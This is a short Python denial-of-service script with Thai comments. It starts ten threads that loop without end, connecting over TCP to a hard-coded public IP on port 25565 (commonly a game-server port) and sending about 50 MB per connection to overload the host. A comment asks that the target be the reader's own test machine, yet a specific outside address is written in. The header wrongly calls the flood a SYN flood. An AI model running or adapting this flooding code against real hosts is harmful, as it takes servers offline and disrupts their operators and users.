import socket
import threading
import time

#ฟังก์ชันสำหรับส่ง TCP SYN flood attack
def dos_attack(ip, port):
    while True:  # ทำงานในลูปไม่สิ้นสุด
        try:
            # สร้าง socket TCP
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            # ส่งคำขอแบบไม่มีข้อมูลจริง
            sock.send(b"Hello" * 10000000)  # ส่งข้อมูลขนาดใหญ่เพื่อสร้างโหลด
            sock.close()
            print(f"Connection successful to {ip}:{port}")
        except socket.error:
            print(f"Connection failed to {ip}:{port}")
        # หน่วงเวลาเพื่อไม่ให้โจมตีเร็วเกินไป
        time.sleep(0.1)

#ข้อมูลเป้าหมายของการทดสอบ (ต้องเป็นเครื่องทดสอบของคุณเอง)
target_ip = "210.246.215.53"  # IP ของเครื่องที่คุณต้องการทดสอบ
target_port = 25565  # พอร์ตเป้าหมาย
num_threads = 10  # จำนวน thread ที่จะใช้ในการโจมตี

#สร้าง thread หลาย ๆ ตัวเพื่อโจมตีพร้อมกัน
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=dos_attack, args=(target_ip, target_port))
    threads.append(thread)
    thread.start()

#รอให้ทุก thread ทำงานเสร็จ (ไม่จบลูปจึงไม่สามารถรอได้)
for thread in threads:
    thread.join()

print("Attack completed.")
